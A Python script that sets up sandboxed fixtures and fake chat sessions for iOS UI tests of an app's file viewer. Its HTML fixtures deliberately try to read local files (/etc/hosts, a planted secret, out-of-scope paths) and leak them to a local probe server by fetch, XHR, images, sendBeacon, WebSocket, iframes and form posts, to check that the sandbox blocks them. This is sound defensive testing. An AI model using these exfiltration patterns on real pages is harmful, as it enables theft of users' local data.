#!/usr/bin/env python3
"""File viewer zoom, sibling navigation and file kinds against an owned sandbox directory. Only
FileReadAloudTests calls a model: a few minutes of speech through the sandbox's `custom.speech`, which caches
each piece; only the first piece (it numbers the run) is generated again on later runs.

Usage (after `xcodebuild … build-for-testing`):
  OPENCODE_SANDBOX_HOME=<sandbox home> OPENCODE_TEST_SERVER_URL=http://127.0.0.1:<port> \
  OPENCODE_TEST_DEVICE=<simulator UDID> OPENCODE_TEST_DERIVED=<DerivedData> OPENCODE_TEST_EVIDENCE=<dir> \
  python3 packages/ios-custom/script/test-file-viewer.py [OpenCodeUITests/FileViewerNavigationTests/testName …]
"""
import base64
import http.server
import json
import os
from pathlib import Path
import plistlib
import shutil
import signal
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
import uuid
import zlib

signal.signal(signal.SIGTERM, lambda *_: sys.exit(143))

url = os.environ["OPENCODE_TEST_SERVER_URL"]
parsed = urllib.parse.urlparse(url)
assert parsed.scheme == "http" and parsed.hostname in {"127.0.0.1", "localhost"} and parsed.port not in {None, 4096, 4178}
home = Path(os.environ["OPENCODE_SANDBOX_HOME"]).resolve()
assert json.loads((home / "sandbox.json").read_text())["port"] == parsed.port
derived = Path(os.environ["OPENCODE_TEST_DERIVED"])
device = os.environ["OPENCODE_TEST_DEVICE"]
evidence = Path(os.environ["OPENCODE_TEST_EVIDENCE"])
evidence.mkdir(parents=True, exist_ok=True)
password = (home / "password").read_text().strip()
headers = {"Authorization": "Basic " + base64.b64encode(("opencode:" + password).encode()).decode(), "Content-Type": "application/json"}

def api(path, body=None, method="POST"):
    request = urllib.request.Request(url + path, data=json.dumps(body).encode() if body is not None else None,
        headers=headers, method=method)
    with urllib.request.urlopen(request, timeout=30) as response:
        data = response.read()
        return json.loads(data) if data else None

def chunk(kind, data):
    return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))

def png(width, height, tint):
    rows = b"".join(b"\0" + b"".join(bytes((tint, 60 + (y * 150) // height, 230 if (x // 60 + y // 60) % 2 else 90))
        for x in range(width)) for y in range(height))
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)) \
        + chunk(b"IDAT", zlib.compress(rows)) + chunk(b"IEND", b"")

def pdf():
    objects = [b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 400 300] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"]
    stream = b"BT /F1 20 Tf 40 220 Td (OpenCode - visualizador PDF) Tj ET"
    objects.append(b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream")
    data = b"%PDF-1.4\n"
    offsets = []
    for number, obj in enumerate(objects, 1):
        offsets.append(len(data))
        data += str(number).encode() + b" 0 obj\n" + obj + b"\nendobj\n"
    start = len(data)
    data += b"xref\n0 6\n0000000000 65535 f \n" + b"".join(f"{offset:010d} 00000 n \n".encode() for offset in offsets)
    return data + b"trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n" + str(start).encode() + b"\n%%EOF\n"

token = uuid.uuid4().hex[:10]
root = home / "repos" / ("file-viewer-" + token)
folder = root / "fixtures"
outside = home / "repos" / ("file-viewer-outside-" + token)
folder.mkdir(parents=True)
(folder / "subpasta").mkdir()
outside.mkdir(parents=True)
created = []
configured = derived / ("Build/Products/FileViewer-" + token + ".xctestrun")
theme = os.environ.get("OPENCODE_TEST_THEME", "openchamber-dark")
signals_dir = evidence / ("signals-" + token)
signals_dir.mkdir(parents=True, exist_ok=True)
environment = {"OPENCODE_VIEWER_SIGNALS": str(signals_dir), "OPENCODE_TEST_PASSWORD": password, "OPENCODE_SERVER_PASSWORD": password, "OPENCODE_TEST_THEME": theme,
    "OPENCODE_TEST_SERVER_URL": url}
try:
    # Server order (directories first, then localeCompare) is the same as the web file tree.
    (folder / "a-imagem.png").write_bytes(png(1200, 800, 40))
    (folder / "subpasta" / "interna.txt").write_text("Arquivo dentro de uma subpasta.\n", encoding="utf8")
    subprocess.run(["sips", "-s", "format", "jpeg", str(folder / "a-imagem.png"), "--out", str(folder / "b-foto.jpg")], check=True, capture_output=True)
    subprocess.run(["sips", "-s", "format", "heic", str(folder / "a-imagem.png"), "--out", str(folder / "d-foto.heic")], check=True, capture_output=True)
    subprocess.run(["ffmpeg", "-hide_banner", "-loglevel", "error", "-f", "lavfi", "-i", "testsrc2=size=320x180:rate=8", "-t", "2", str(folder / "c-animacao.gif")], check=True)
    (folder / "e-vetor.svg").write_text('<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200"><rect width="300" height="200" fill="#3366cc"/><text x="20" y="110" font-size="28" fill="white">SVG do visualizador</text></svg>\n', encoding="utf8")
    (folder / "f-notas.md").write_text("# Notas do visualizador\n\n- Markdown **preservado**\n- Segundo item\n", encoding="utf8")
    (folder / "g-dados.json").write_text('{"visualizador": "JSON preservado", "itens": [1, 2, 3]}\n', encoding="utf8")
    (folder / "h-codigo.ts").write_text('export const visualizador = "TypeScript preservado"\n', encoding="utf8")
    (folder / "i-documento.pdf").write_bytes(pdf())
    subprocess.run(["ffmpeg", "-hide_banner", "-loglevel", "error", "-f", "lavfi", "-i", "testsrc2=size=640x360:rate=24", "-t", "30", "-c:v", "libx264", "-preset", "ultrafast", "-crf", "32", "-pix_fmt", "yuv420p", "-movflags", "+faststart", str(folder / "j-video.mp4")], check=True)
    subprocess.run(["ffmpeg", "-hide_banner", "-loglevel", "error", "-f", "lavfi", "-i", "sine=frequency=440", "-t", "30", str(folder / "k-audio.wav")], check=True)
    # The same short picture without and with an audio track, for the audio-session tests (not viewer siblings).
    media = root / "video-audio"
    media.mkdir()
    subprocess.run(["ffmpeg", "-hide_banner", "-loglevel", "error", "-f", "lavfi", "-i", "testsrc2=size=320x240:rate=12", "-t", "3",
        "-c:v", "libx264", "-pix_fmt", "yuv420p", str(media / "sem-audio.mp4")], check=True)
    subprocess.run(["ffmpeg", "-hide_banner", "-loglevel", "error", "-f", "lavfi", "-i", "testsrc2=size=320x240:rate=12", "-f", "lavfi",
        "-i", "sine=frequency=330", "-t", "3", "-c:v", "libx264", "-pix_fmt", "yuv420p", "-c:a", "aac", "-shortest",
        str(media / "com-audio.mp4")], check=True)
    environment["OPENCODE_VIEWER_VIDEO_SILENT"] = str(media / "sem-audio.mp4")
    environment["OPENCODE_VIEWER_VIDEO_SOUND"] = str(media / "com-audio.mp4")
    subprocess.run(["ffmpeg", "-hide_banner", "-loglevel", "error", "-f", "lavfi", "-i", "sine=frequency=660", "-t", "30", "-c:a", "aac", str(folder / "l-audio.m4a")], check=True)
    (folder / "m-binario.opaque").write_bytes(bytes(range(256)))
    (folder / "n-texto.txt").write_text("Texto simples do visualizador.\n", encoding="utf8")
    # Markdown documents: the app's formatting fixture, a large real README and edge cases.
    docs = folder / "docs"
    docs.mkdir()
    package = Path(__file__).resolve().parents[1]
    shutil.copyfile(package / "OpenCode/Fixtures/markdown-fixture.md", docs / "a-formatacao.md")
    shutil.copyfile(package / "README.md", docs / "b-readme.md")
    (docs / "imagem-docs.png").write_bytes(png(480, 240, 220))
    (docs / "c-recursos.md").write_text("""---
title: Recursos do visualizador
tags: [ios, markdown]
---

# Recursos do visualizador

Parágrafo com **negrito**, *itálico*, `código` e um [link externo](https://example.com).

## Tabela

| Coluna | Valor | Observação |
| --- | ---: | --- |
| Primeira | 10 | Texto curto |
| Segunda | 200 | Texto um pouco mais longo para quebrar a linha da célula |

## Código

```swift
struct Visualizador {
  let nome = "Markdown renderizado"
}
```

> Citação com **ênfase** e um segundo parágrafo.
>
> Fim da citação.

- [x] Tarefa concluída
- [ ] Tarefa pendente

![Imagem relativa](imagem-docs.png)

![Imagem da pasta acima](../a-imagem.png)

```text
Bloco antes do link
```

[Abrir o outro documento](d-outro.md)

```text
Bloco depois do link
```

<details><summary>HTML simples</summary>Conteúdo<br>com quebra.</details>

## Seção final

Último parágrafo do documento de recursos.
""", encoding="utf8")
    (docs / "d-outro.md").write_text("# Outro documento 🚀\n\nAcentuação: ação, coração, pinguim, über. Emoji: 👩🏽‍💻 ✅\n\n1. Um\n2. Dois\n", encoding="utf8")
    (docs / "e-vazio.md").write_text("", encoding="utf8")
    # Read aloud: several pieces (short first, then longer) of varied prose, with code and a table announced instead of
    # read. Gemini TTS tends to stop early on text that repeats itself, so no paragraph repeats.
    parts = [
        ("Como o áudio é gerado", "O aplicativo envia o texto ao servidor em trechos, e o servidor pede a fala ao modelo. "
         "Cada trecho volta comprimido, ocupando bem menos espaço do que um arquivo sem compressão. "
         "Enquanto um trecho toca, os dois seguintes já estão sendo preparados, para que a narração siga sem pausas longas. "
         "Se a conexão falhar no meio do caminho, o player mostra um aviso e permite tentar de novo."),
        ("Onde a leitura para", "Ao pausar ou fechar o documento, o lugar da leitura fica guardado no servidor. "
         "Na próxima vez, o player abre parado nesse ponto e espera você tocar para continuar. "
         "Quando o documento termina, o lugar é esquecido e a leitura volta ao começo. "
         "Também é possível recomeçar do início a qualquer momento, pelo player completo."),
        ("Velocidade e tempo", "A velocidade alterna entre normal, uma vez e meia e duas vezes, sem mudar o tom da voz. "
         "O tempo total começa estimado pelo ritmo que o servidor aprendeu com as leituras anteriores. "
         "Conforme os trechos chegam, a estimativa passa a usar o ritmo medido neste próprio documento. "
         "Assim, o total fica perto do real logo nos primeiros segundos."),
        ("Custos e limites", "Só é gerado o trecho que está para tocar, e nada mais. "
         "Pular para o meio do documento gera apenas o trecho daquele ponto e os dois seguintes. "
         "Documentos muito longos pedem confirmação antes de começar, mostrando o custo estimado. "
         "Trechos já ouvidos ficam guardados no servidor e não são cobrados de novo."),
        ("Sessão de áudio", "A leitura usa a sessão de áudio de reprodução falada do sistema. "
         "Uma ligação ou a Siri interrompem a narração, que volta quando o sistema recomenda. "
         "Desconectar o fone de ouvido pausa a leitura na hora, como em qualquer aplicativo de áudio. "
         "O modo de voz e o ditado também pausam o player antes de abrir o microfone."),
        ("Tela bloqueada", "Com a tela bloqueada, o título do documento aparece nos controles do sistema. "
         "Dali dá para pausar, continuar, avançar ou voltar quinze segundos e arrastar a posição. "
         "Fechar o arquivo encerra a leitura e libera esses controles. "
         "Trocar para outro arquivo da mesma pasta também encerra a leitura anterior."),
        ("Texto falável", "Títulos, parágrafos e listas são lidos como estão escritos. "
         "Blocos de código e tabelas são apenas anunciados, com a linguagem e o número de linhas. "
         "Imagens são lidas pelo texto alternativo, e fórmulas são apenas mencionadas. "
         "Notas de rodapé, separadores e metadados do começo do arquivo ficam de fora."),
    ]
    (docs / "f-leitura.md").write_text("# Leitura em voz alta\n\nExecução número " + str(int(token[:5], 16)) + ".\n\n"
        + "Este documento serve para testar a leitura em voz alta do visualizador de arquivos.\n\n"
        + "## Como usar\n\n- Toque no botão de reproduzir.\n- Arraste a barra para pular.\n- Mude a velocidade.\n\n"
        + "```swift\nlet leitura = true\n```\n\n| Ação | Gesto |\n| --- | --- |\n| Pular | Arrastar |\n\n"
        + "\n\n".join(["## " + title + "\n\n" + body for title, body in parts]) + "\n", encoding="utf8")
    (docs / "g-anexo.md").write_text("# Anexo\n\nÚltimo documento da pasta.\n", encoding="utf8")
    # Above the Session directory, reachable through the session file explorer's `../`.
    (root / "acima.png").write_bytes(png(600, 400, 160))
    (root / "acima.txt").write_text("Arquivo acima da sessão.\n", encoding="utf8")
    (outside / "fora.png").write_bytes(png(600, 400, 200))
    (outside / "fora-2.png").write_bytes(png(600, 400, 120))
    data_uri = "data:image/png;base64," + base64.b64encode(png(300, 200, 90)).decode()
    links = {"PNG": "a-imagem.png", "JPG": "b-foto.jpg", "GIF": "c-animacao.gif", "HEIC": "d-foto.heic", "SVG": "e-vetor.svg",
        "MD": "f-notas.md", "JSON": "g-dados.json", "TS": "h-codigo.ts", "PDF": "i-documento.pdf", "MP4": "j-video.mp4",
        "WAV": "k-audio.wav", "M4A": "l-audio.m4a", "OPAQUE": "m-binario.opaque", "TXT": "n-texto.txt"}
    text = "Arquivos do visualizador:\n\n" + "\n".join("- [Abrir " + key + "](" + value + ")" for key, value in links.items()) \
        + "\n- [Abrir externo](" + str(outside / "fora.png") + ")"
    docs_text = "Documentos:\n\n" + "\n".join("- [Abrir doc " + key + "](docs/" + value + ")" for key, value in
        {"FORMATACAO": "a-formatacao.md", "README": "b-readme.md", "RECURSOS": "c-recursos.md", "OUTRO": "d-outro.md", "VAZIO": "e-vazio.md", "LEITURA": "f-leitura.md"}.items())
    # Joined response prose exposes one text view without per-link elements, so each link also gets a session
    # whose whole message is that link.
    single = {**{"LINK_" + key: "[Abrir " + key + "](" + value + ")" for key, value in links.items()},
        "LINK_EXTERNO": "[Abrir externo](" + str(outside / "fora.png") + ")",
        **{"LINK_DOC_" + key: "[Abrir doc " + key + "](docs/" + value + ")" for key, value in
            {"FORMATACAO": "a-formatacao.md", "README": "b-readme.md", "RECURSOS": "c-recursos.md", "OUTRO": "d-outro.md", "VAZIO": "e-vazio.md", "LEITURA": "f-leitura.md"}.items()}}
    # Folder links: an explicit relative link, inline code with and without a trailing slash, an absolute
    # folder outside the Session directory and a missing folder.
    environment["OPENCODE_VIEWER_DOCS_FOLDER"] = str(folder / "docs")
    environment["OPENCODE_VIEWER_OUTSIDE_FOLDER"] = str(outside)
    single.update({"LINK_PASTA": "[Abrir pasta](docs/)", "FOLDER_CODE": "`docs/`", "FOLDER_CODE_BARE": "`./docs`",
        "FOLDER_ABSOLUTE": "`" + str(outside) + "`", "FOLDER_MISSING": "`docs/inexistente/`"})
    # HTML previews. A local probe records the page's own requests, so the test can check that they reach the
    # network without any credential, even when challenged.
    probe_log = signals_dir / "probe.json"
    probe_requests = []
    probe_lock = threading.Lock()
    class Probe(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            # Requests arrive on several threads; the log is replaced atomically so a reader never sees half of it.
            with probe_lock:
                probe_requests.append({"path": self.path, "authorization": self.headers.get("Authorization") is not None,
                    "cookie": self.headers.get("Cookie") is not None})
                partial = probe_log.with_suffix(".tmp")
                partial.write_text(json.dumps(probe_requests))
                partial.replace(probe_log)
            self.send_response(401)
            self.send_header("WWW-Authenticate", 'Basic realm="probe"')
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
        def log_message(self, *args):
            pass
    probe = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Probe)
    threading.Thread(target=probe.serve_forever, daemon=True).start()
    probe_url = "http://127.0.0.1:" + str(probe.server_address[1])
    pages = folder / "html"
    pages.mkdir()
    (pages / "a-estatico.html").write_text("""<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><title>Estático</title>
<style>body{font-family:-apple-system;margin:24px;color:#222;background:#fdfbf7}h1{color:#b4501e}td,th{border:1px solid #ccc;padding:6px}</style>
</head><body><h1>Página estática do visualizador</h1><p>Parágrafo com <strong>negrito</strong> e <a href="#fim">âncora interna</a>.</p>
<table><tr><th>Item</th><th>Valor</th></tr><tr><td>Primeiro</td><td>10</td></tr></table>
<p id="fim">Fim da página estática.</p></body></html>""", encoding="utf8")
    (pages / "b-relatorio.html").write_text("""<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><title>Relatório</title>
<style>body{font-family:-apple-system;margin:24px}.ok{color:#1a7f37}.falha{color:#cf222e}</style></head>
<body><div id="app">Carregando relatório…</div>
<script id="dados" type="application/json">{"testes":[{"nome":"abre o visualizador","ok":true},{"nome":"mostra a prévia","ok":true},{"nome":"bloqueia a saída","ok":false}]}</script>
<script>
const dados = JSON.parse(document.getElementById("dados").textContent)
const passou = dados.testes.filter((t) => t.ok).length
document.getElementById("app").innerHTML = "<h1>Relatório sintético</h1><p>" + dados.testes.length + " testes, " + passou +
  " passaram</p><ul>" + dados.testes.map((t) => "<li class='" + (t.ok ? "ok" : "falha") + "'>" + t.nome + "</li>").join("") + "</ul>"
</script></body></html>""", encoding="utf8")
    (pages / "c-seguranca.html").write_text("""<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><title>Segurança</title>
<style>body{font-family:-apple-system;margin:24px}a{display:block;font-size:22px;margin:24px 0}</style></head>
<body><h1>Página de segurança</h1>
<p id="arquivo">arquivo: testando</p><p id="rede">rede: testando</p><p id="local">local: testando</p>
<img src="z-local.png" width="1" height="1" alt="" onload="document.getElementById('local').textContent = 'local: carregou'"
  onerror="document.getElementById('local').textContent = 'local: falhou'">
<a href="https://example.com/tocado">Abrir site externo</a>
<a href="https://example.com/nova-janela" target="_blank">Abrir em nova janela</a>
<img src="PROBE/imagem" alt="" width="1" height="1">
<script>
fetch("file:///etc/hosts").then((r) => r.text()).then((t) => { document.getElementById("arquivo").textContent = "arquivo: lido " + t.length })
  .catch(() => { document.getElementById("arquivo").textContent = "arquivo: bloqueado" })
fetch("PROBE/fetch", { credentials: "include" }).then((r) => { document.getElementById("rede").textContent = "rede: respondeu " + r.status })
  .catch(() => { document.getElementById("rede").textContent = "rede: falhou" })
setTimeout(() => { window.open("https://example.com/janela-automatica") }, 400)
setTimeout(() => { location.href = "https://example.com/fuga" }, 900)
setTimeout(() => { document.querySelector("a").click() }, 1400)
</script></body></html>""".replace("PROBE", probe_url), encoding="utf8")
    with (pages / "d-grande.htm").open("wb") as output:
        output.write(b"<!doctype html><p>Grande</p>")
        output.truncate(26 * 1024 * 1024)
    (pages / "z-local.png").write_bytes(png(8, 8, 50))
    # Local-files mode: a page with resources in subfolders (like the reported live-activities page), a report
    # of several pages, and a page that reads a local file and tries every way out.
    local = folder / "html-local"
    for sub in ["t3code", "css", "fonts", "js", "img", "relatorio"]:
        (local / sub).mkdir(parents=True)
    (local / "t3code" / "real-lockscreen-detail.png").write_bytes(png(390, 240, 20))
    (local / "t3code" / "detalhe@2x.png").write_bytes(png(390, 240, 140))
    (local / "img" / "fundo.png").write_bytes(png(60, 60, 230))
    shutil.copyfile("/System/Library/Fonts/Supplemental/Andale Mono.ttf", local / "fonts" / "fixture.ttf")
    (local / "css" / "estilo.css").write_text("""@font-face { font-family: Fixture; src: url(../fonts/fixture.ttf) format("truetype"); }
h1 { color: rgb(180, 80, 30); font-family: Fixture, monospace; }
.fundo { height: 40px; background: url("../img/fundo.png") repeat; }
""", encoding="utf8")
    (local / "js" / "app.js").write_text("window.jsLocal = 'ok'\n", encoding="utf8")
    (local / "js" / "util.mjs").write_text("export const valor = 'ok'\n", encoding="utf8")
    (local / "js" / "mod.mjs").write_text("import { valor } from './util.mjs'\nwindow.modulo = valor\n", encoding="utf8")
    (local / "segredo.txt").write_text("conteudo-local-secreto", encoding="utf8")
    (local / "index.html").write_text("""<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><title>Live Activities</title>
<link rel="stylesheet" href="css/estilo.css"><script src="js/app.js"></script><script type="module" src="js/mod.mjs"></script>
<style>body{font-family:-apple-system;margin:20px;background:#14161c;color:#e8e8ea}img{max-width:100%;border-radius:12px}</style>
</head><body><h1>Código aberto — capturas reais</h1>
<p id="estado">estado: carregando</p><div class="fundo"></div>
<h2>T3 Code</h2><img id="i1" loading="lazy" src="t3code/real-lockscreen-detail.png" alt="captura real">
<img id="i2" srcset="t3code/detalhe@2x.png 2x" src="t3code/real-lockscreen-detail.png" alt="srcset">
<p><a href="relatorio/index.html">Abrir relatório de várias páginas</a></p>
<script>
window.addEventListener("load", async () => {
  await document.fonts.ready
  // A lazy image may still be loading after the load event.
  await Promise.all(["i1", "i2"].map((id) => document.getElementById(id).decode().catch(() => null)))
  const imagens = ["i1", "i2"].filter((id) => document.getElementById(id).naturalWidth > 0).length
  const css = getComputedStyle(document.querySelector("h1")).color === "rgb(180, 80, 30)" ? "ok" : "falhou"
  const fonte = document.fonts.check("12px Fixture") && [...document.fonts].some((f) => f.family.includes("Fixture") && f.status === "loaded") ? "ok" : "falhou"
  setTimeout(() => {
    document.getElementById("estado").textContent = "estado: imagens " + imagens + "/2 · css " + css + " · fonte " + fonte +
      " · js " + (window.jsLocal || "falhou") + " · modulo " + (window.modulo || "falhou")
  }, 300)
})
</script></body></html>""", encoding="utf8")
    (local / "relatorio" / "index.html").write_text("""<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width">
<link rel="stylesheet" href="../css/estilo.css"><h1>Relatório · página 1</h1>
<p><a href="pagina-2.html" style="font-size:22px">Ir para a página 2</a></p>""", encoding="utf8")
    (local / "relatorio" / "pagina-2.html").write_text("""<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width">
<h1>Relatório · página 2</h1><p><a href="index.html" style="font-size:22px">Voltar à página 1</a></p>
<p id="fora">fora: testando</p>
<script>fetch("../../../fora-do-escopo.dat").then((r) => r.ok ? r.text() : Promise.reject())
  .then(() => { document.getElementById("fora").textContent = "fora: lido" })
  .catch(() => { document.getElementById("fora").textContent = "fora: negado" })</script>""", encoding="utf8")
    # Above the Session directory: outside every scope of these pages (and not a viewer sibling).
    (root / "fora-do-escopo.dat").write_text("nao deveria ser lido", encoding="utf8")
    (local / "vazamento.html").write_text("""<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><link rel="prefetch" href="PROBE/vazamento/prefetch">
<style>body{font-family:-apple-system;margin:24px}</style></head><body><h1>Tentativas de vazamento</h1>
<p id="segredo">segredo: testando</p><p id="fora">fora: testando</p><p id="saida">saída: testando</p>
<form id="form" method="post" action="PROBE/vazamento/form"><input name="d" value=""></form>
<script>
const marcar = (id, texto) => { document.getElementById(id).textContent = texto }
fetch("../../fora-do-escopo.dat").then((r) => r.ok ? marcar("fora", "fora: lido") : marcar("fora", "fora: negado"))
  .catch(() => marcar("fora", "fora: negado"))
fetch("segredo.txt").then((r) => r.text()).then((segredo) => {
  marcar("segredo", "segredo: lido")
  const d = encodeURIComponent(segredo)
  const tentativas = []
  tentativas.push(fetch("PROBE/vazamento/fetch?d=" + d, { mode: "no-cors" }).then(() => "fetch").catch(() => null))
  tentativas.push(new Promise((ok) => { const x = new XMLHttpRequest(); x.open("GET", "PROBE/vazamento/xhr?d=" + d)
    x.onload = () => ok("xhr"); x.onerror = () => ok(null); x.send() }))
  tentativas.push(new Promise((ok) => { const i = new Image(); i.onload = () => ok("img"); i.onerror = () => ok(null)
    i.src = "PROBE/vazamento/img?d=" + d }))
  try { navigator.sendBeacon("PROBE/vazamento/beacon", segredo) } catch {}
  try { const w = new WebSocket("WSPROBE/vazamento/ws?d=" + d); w.onopen = () => marcar("saida", "saída: websocket abriu") } catch {}
  const f = document.createElement("iframe"); f.src = "PROBE/vazamento/frame?d=" + d; document.body.appendChild(f)
  document.querySelector("input").value = segredo
  setTimeout(() => document.getElementById("form").submit(), 300)
  Promise.all(tentativas).then((r) => { const ok = r.filter(Boolean)
    marcar("saida", ok.length ? "saída: chegou por " + ok.join(",") : "saída: bloqueada") })
}).catch(() => marcar("segredo", "segredo: falhou"))
</script></body></html>""".replace("WSPROBE", probe_url.replace("http", "ws")).replace("PROBE", probe_url), encoding="utf8")
    live = outside / "live-activities"
    (live / "t3code").mkdir(parents=True)
    (live / "t3code" / "real-lockscreen-detail.png").write_bytes(png(390, 240, 60))
    (live / "t3code" / "render-lockscreen-states.png").write_bytes(png(390, 240, 160))
    (live / "index.html").write_text("""<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><title>Live Activities</title>
<style>body{font-family:-apple-system;margin:20px;background:#14161c;color:#e8e8ea}img{width:100%;border-radius:12px;margin:8px 0}
.tag{background:#1d3b28;color:#7fd99a;padding:2px 8px;border-radius:6px;font-size:13px}</style></head>
<body><h1>Código aberto — capturas reais + reconstruções do código</h1>
<p id="estado">estado: carregando</p><p id="fora">fora: testando</p><h2>T3 Code (Theo / pingdotgg)</h2>
<p><span class="tag">captura real/oficial</span> real-lockscreen-detail.png</p>
<img loading="lazy" src="t3code/real-lockscreen-detail.png" alt="real-lockscreen-detail.png">
<p><span class="tag">reconstrução do código</span> render-lockscreen-states.png</p>
<img loading="lazy" src="t3code/render-lockscreen-states.png" alt="render-lockscreen-states.png">
<script>window.addEventListener("load", async () => {
  // Lazy images may still be loading after the load event.
  await Promise.all([...document.images].map((i) => i.decode().catch(() => null)))
  const ok = [...document.images].filter((i) => i.naturalWidth > 0).length
  document.getElementById("estado").textContent = "estado: " + ok + " de " + document.images.length + " imagens"
})
fetch("../fora.png").then((r) => { document.getElementById("fora").textContent = r.ok ? "fora: lido" : "fora: negado" })
  .catch(() => { document.getElementById("fora").textContent = "fora: negado" })</script></body></html>""", encoding="utf8")
    (pages / "e-pagina.htm").write_text("<!doctype html><meta charset=utf-8><meta name=viewport content='width=device-width'><h1>Página HTM unificada</h1>", encoding="utf8")
    environment["OPENCODE_VIEWER_PROBE_LOG"] = str(probe_log)
    single.update({"LINK_HTML_A": "[Abrir HTML_A](html/a-estatico.html)", "LINK_HTML_B": "[Abrir HTML_B](html/b-relatorio.html)",
        "LINK_HTML_C": "[Abrir HTML_C](html/c-seguranca.html)", "LINK_HTML_D": "[Abrir HTML_D](html/d-grande.htm)",
        "LINK_HTML_E": "[Abrir HTML_E](html/e-pagina.htm)", "LINK_LOCAL_INDEX": "[Abrir LOCAL_INDEX](html-local/index.html)",
        "LINK_LOCAL_VAZAMENTO": "[Abrir LOCAL_VAZAMENTO](html-local/vazamento.html)",
        "LINK_LIVE": "[Abrir LIVE](" + str(live / "index.html") + ")"})
    # The session folder as a checkout with one changed file, for Alterados in the viewer's Arquivos drawer. Its
    # own repository: one around the whole fixture would make Detalhes da sessão open the repository's top.
    git = ["git", "-C", str(folder), "-c", "user.name=Visualizador", "-c", "user.email=visualizador@example.com", "-c", "commit.gpgsign=false"]
    subprocess.run(git + ["init", "-q"], check=True)
    subprocess.run(git + ["add", "-A"], check=True)
    subprocess.run(git + ["commit", "-q", "-m", "fixture"], check=True)
    with (folder / "f-notas.md").open("a", encoding="utf8") as notes:
        notes.write("- Linha alterada depois do commit\n")
    messages = {**single, "LINKS": text, "DOCS": docs_text, "FEED": "Imagem incorporada:\n\n![Quadro](a-imagem.png)", "DATA": "Imagem embutida:\n\n![Embutida](" + data_uri + ")"}
    now = int(time.time() * 1000)
    for role, body in messages.items():
        session = "ses_" + uuid.uuid4().hex
        api("/api/experimental/session/import", {"info": {"id": session, "title": "Visualizador · " + role, "projectID": "global",
            "location": {"directory": str(folder)}, "agent": "build", "model": {"providerID": "llm-proxy", "id": "gpt-6-luna", "variant": "low"},
            "cost": 0, "tokens": {"input": 0, "output": 0, "reasoning": 0, "cache": {"read": 0, "write": 0}}, "outcome": "succeeded",
            "time": {"created": now, "updated": now, "idle": now, "viewed": now}}, "location": {"directory": str(folder)},
            "messages": [{"id": "msg_" + uuid.uuid4().hex, "type": "user", "text": "Verificação isolada do visualizador.", "time": {"created": now - 1000}},
                {"id": "msg_" + uuid.uuid4().hex, "type": "assistant", "agent": "build", "model": {"providerID": "llm-proxy", "id": "gpt-6-luna", "variant": "low"},
                 "time": {"created": now - 900, "completed": now - 600}, "finish": "stop", "content": [{"type": "text", "text": body}]}]})
        created.append(session)
        environment["OPENCODE_VIEWER_" + role] = session
    # Two answered prompts for reading chat answers aloud (ChatReadAloudTests); the second answer also has a tool
    # call between its texts. Each run numbers its answers, so their first pieces are generated again.
    model = {"providerID": "llm-proxy", "id": "gpt-6-luna", "variant": "low"}
    chat = "ses_" + uuid.uuid4().hex
    answers = ["msg_" + uuid.uuid4().hex for _ in range(3)]
    number = str(int(token[:5], 16))
    api("/api/experimental/session/import", {"info": {"id": chat, "title": "Leitura de respostas", "projectID": "global",
        "location": {"directory": str(folder)}, "agent": "build", "model": model,
        "cost": 0, "tokens": {"input": 0, "output": 0, "reasoning": 0, "cache": {"read": 0, "write": 0}}, "outcome": "succeeded",
        "time": {"created": now, "updated": now, "idle": now, "viewed": now}}, "location": {"directory": str(folder)},
        "messages": [
            {"id": "msg_" + uuid.uuid4().hex, "type": "user", "text": "Explique a leitura em voz alta.", "time": {"created": now - 9000}},
            {"id": answers[0], "type": "assistant", "agent": "build", "model": model, "time": {"created": now - 8900, "completed": now - 8000},
             "finish": "stop", "content": [{"type": "text", "text": "Primeira resposta número " + number + ". A leitura em voz alta "
                 "transforma a resposta em fala no servidor e toca no aplicativo. O botão ao lado de copiar começa a leitura, "
                 "e a pílula no canto mostra o tempo, a velocidade e o progresso. Tocar no tempo abre o player completo."}]},
            {"id": "msg_" + uuid.uuid4().hex, "type": "user", "text": "E onde ela para?", "time": {"created": now - 7000}},
            {"id": answers[1], "type": "assistant", "agent": "build", "model": model, "time": {"created": now - 6900, "completed": now - 6500},
             "finish": "tool-calls", "content": [{"type": "text", "text": "Segunda resposta número " + number + ". Vou conferir onde a posição fica guardada."},
                 {"type": "tool", "id": "call_" + uuid.uuid4().hex, "name": "read", "state": {"status": "completed", "input": {"path": "speech.md"},
                  "content": [{"type": "text", "text": "Conteúdo que não deve ser lido."}]}, "time": {"created": now - 6800, "completed": now - 6700}}]},
            {"id": answers[2], "type": "assistant", "agent": "build", "model": model, "time": {"created": now - 6400, "completed": now - 6000},
             "finish": "stop", "content": [{"type": "text", "text": "A posição fica guardada no servidor, por sessão e por mensagem. "
                 "Ao reabrir a conversa e tocar de novo na mesma resposta, o player aparece pausado onde a leitura parou. "
                 "Quando a resposta termina, a posição é esquecida e a próxima leitura começa do início."}]},
        ]})
